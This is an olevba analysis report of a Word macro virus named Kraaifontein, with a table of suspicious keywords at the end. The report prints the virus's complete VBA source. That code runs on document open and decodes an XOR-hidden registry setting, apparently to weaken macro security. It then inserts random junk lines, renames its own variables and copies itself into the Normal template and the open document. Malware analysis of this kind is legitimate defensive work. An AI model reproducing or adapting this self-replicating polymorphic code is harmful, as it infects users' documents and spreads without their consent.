olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kraafontein
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kraafontein - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument2.cls 
in file: Virus.MSWord.Kraafontein - OLE stream: 'Macros/VBA/ThisDocument2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Autoopen()
'
HOSHTFFHOSH = Int(Rnd * False) + (True * -255)
'
HOSHKEYHOSH = HOSHCRPTHOSH("·´ş¦ ĽŞ­­ş±« Ş¬ş­Ł¬�™‹�žŤšŁ˛–śŤ�Ś�™‹Ł°™™–śšŁĆŃĎŁ¨�Ť›Ł¬šśŠŤ–‹†", HOSHTFFHOSH)
'
HOSHLVLHOSH = HOSHCRPTHOSH("łš‰š“", HOSHTFFHOSH)
'
System.PrivateProfileString("", HOSHKEYHOSH, HOSHLVLHOSH) = &H1
'
Set HOSHNORHOSH = NormalTemplate.VBProject.VBComponents(1).CodeModule
'
Set HOSHDOCHOSH = ActiveDocument.VBProject.VBComponents(1).CodeModule
'
Set HOSHTHSHOSH = ThisDocument.VBProject.VBComponents(1).CodeModule
'
Do
'
HOSHSHITHOSH = HOSHSHITHOSH + 2
'
HOSHKDHOSH = HOSHGETHOSH(Int(Rnd * 45) + 5)
'
HOSHTHSHOSH.REPLACELINE HOSHSHITHOSH, HOSHKDHOSH
'
Loop Until HOSHSHITHOSH = 36
'
HOSHCODEHOSH = HOSHPLYHOSH(Int(Rnd * 20) + 5, HOSHTHSHOSH.lines(1, 200), "HOSH")
'
HOSHDELHOSH = HOSHNORHOSH.DELETELINES(1, HOSHNORHOSH.COUNTOFLINES)
'
HOSHADDHOSH = HOSHNORHOSH.ADDFROMSTRING(HOSHCODEHOSH)
'
HOSHDELHOSH = HOSHDOCHOSH.DELETELINES(1, HOSHDOCHOSH.COUNTOFLINES)
'
HOSHADDHOSH = HOSHDOCHOSH.ADDFROMSTRING(HOSHCODEHOSH)
'
End Sub
Private Function HOSHGETHOSH(HOSHNUMHOSH)
HOSHRNDHOSH = Int(Rnd * 2)
Select Case HOSHRNDHOSH
Case 0
    For HOSHINTHOSH = 1 To HOSHNUMHOSH
    Randomize Timer
    HOSHRNDHOSH = Int(Rnd * 4)
    Select Case HOSHRNDHOSH
    Case 0: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 65)
    Case 1: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 97)
    Case 2: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 65) & Int(Rnd * 10)
    Case 3: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 97) & Int(Rnd * 10)
    End Select
    Next
    HOSHRNDHOSH = Int(Rnd * 6)
    Select Case HOSHRNDHOSH
    Case 0: HOSHKHOSH = " XOR "
    Case 1: HOSHKHOSH = " AND "
    Case 2: HOSHKHOSH = " OR "
    Case 3: HOSHKHOSH = " + "
    Case 4: HOSHKHOSH = " * "
    Case 5: HOSHKHOSH = " - "
    End Select
    HOSHGETHOSH = HOSHWRDHOSH & " = " & HOSHWRDHOSH & HOSHKHOSH & HOSHWRDHOSH
Case 1
    HOSHRNDHOSH = Int(Rnd * 2)
    Select Case HOSHRNDHOSH
    Case 0: HOSHKHOSH = "''' "
    Case 1: HOSHKHOSH = "REM "
    End Select
    For HOSHINTHOSH = 1 To Int(Rnd * 40) + 10
        Randomize Timer
        HOSHRNDHOSH = Int(Rnd * 4)
        Select Case HOSHRNDHOSH
        Case 0: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 65)
        Case 1: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 97)
        Case 2: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 65) & Int(Rnd * 10)
        Case 3: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 97) & Int(Rnd * 10)
        End Select
    Next
    HOSHGETHOSH = HOSHKHOSH & HOSHWRDHOSH
End Select
End Function

Private Function HOSHCRPTHOSH(HOSHSTRHOSH, HOSHKEEHOSH)
HOSHVARHOSH = ""
HOSHONEHOSH = Int(Rnd * 0) + 1
For HOSHINTHOSH = HOSHONEHOSH To Len(HOSHSTRHOSH)
HOSHVARHOSH = HOSHVARHOSH & Chr(Asc(Mid(HOSHSTRHOSH, HOSHINTHOSH, HOSHONEHOSH)) Xor HOSHKEEHOSH)
Next
HOSHCRPTHOSH = HOSHVARHOSH
End Function

Private Function HOSHPLYHOSH(HOSHHIGHHOSH, HOSHCODEHOSH, HOSHWORDHOSH)
For HOSHINTHOSH = 1 To HOSHHIGHHOSH
Randomize Timer
HOSHRNDHOSH = Int(Rnd * 4)
Select Case HOSHRNDHOSH
Case 0: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 65)
Case 1: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 97)
Case 2: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 65) & Int(Rnd * 10)
Case 3: HOSHWRDHOSH = HOSHWRDHOSH & Chr(Int(Rnd * 25) + 97) & Int(Rnd * 10)
End Select
Next
Do While InStr(HOSHCODEHOSH, HOSHWORDHOSH) <> 0
HOSHCODEHOSH = Mid(HOSHCODEHOSH, 1, InStr(HOSHCODEHOSH, HOSHWORDHOSH) - 1) & HOSHWRDHOSH & Mid(HOSHCODEHOSH, InStr(HOSHCODEHOSH, HOSHWORDHOSH) + Len(HOSHWORDHOSH))
Loop
HOSHPLYHOSH = HOSHCODEHOSH
Rem WM97.KRAAIFONTEIN
End Function











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|XOR                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDFROMSTRING       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

